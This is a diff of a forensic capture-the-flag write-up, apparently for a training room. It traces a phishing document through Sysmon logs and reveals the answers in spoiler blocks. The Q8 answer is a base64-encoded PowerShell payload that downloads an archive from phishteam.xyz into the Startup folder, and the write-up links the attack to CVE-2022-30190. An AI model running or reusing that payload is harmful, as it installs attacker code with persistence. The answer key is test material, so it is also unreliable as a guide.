@@ -74,7 +74,7 @@ Searching a little bit we will find the name of the file.
   </div>
 </details>
 
-#### Q5: What is the name of the compromised user and machine?
+### Q5: What is the name of the compromised user and machine?
 
 We can find this information in the same event we found, care with the format to answer the question.
 
@@ -85,7 +85,7 @@ We can find this information in the same event we found, care with the format to
   </div>
 </details>
 
-#### Q6: What is the PID of the Microsoft Word process that opened the malicious document?
+### Q6: What is the PID of the Microsoft Word process that opened the malicious document?
 
 This also we found it when I started looking for the file, so we already have it.
 
@@ -96,7 +96,7 @@ This also we found it when I started looking for the file, so we already have it
   </div>
 </details>
 
-##### Q7: Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
+#### Q7: Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
 
 Now, still searching for the process ID 496, we can look what `Map Description` does contain a `DNS Event (DNS query)`. Following the event of the previous document we can find two, one named `ecs.office.com` and the other `phishteam.xyz`, we can see that one of these is already suspicious by the name and the TLD, if we investigate the event of the suspicious event we will find the answer.
 
@@ -107,5 +107,38 @@ Now, still searching for the process ID 496, we can look what `Map Description` 
   </div>
 </details>
 
+### Q8: What is the base64 encoded string in the malicious payload executed by the document?
 
-#### Q8: What is the base64 encoded string in the malicious payload executed by the document?
+For this one since its an execution its probably another sysmon event ID 1, a process creation, so we can check the following process creations and also we know that ist from the document so the parent process ID will be the one we found at **Q6**. Knowing this we will find the answer in the `Executable Info` of the event.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
+  </div>
+</details>
+
+### Q9: What is the CVE number of the exploit used by the attacker to achieve a remote code execution? 
+
+The previous event contains a script, this will give us the clue. If we search part of the script we will find information about the CVE.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    2022-30190
+  </div>
+</details>
+
+## Task 5
+
+### Q10: The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
+Now that we have the base64 string from **Q8** we can decode it, and it will have a path, we only have to guess un part of the path, that is related to the ApplicationData. We know the username, and the other part we can guess it if we know how the AppData folder is structured.
+
+<details>
+  <summary>Click to reveal the answer</summary>
+  <div>
+    C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+  </div>
+</details>
+
+
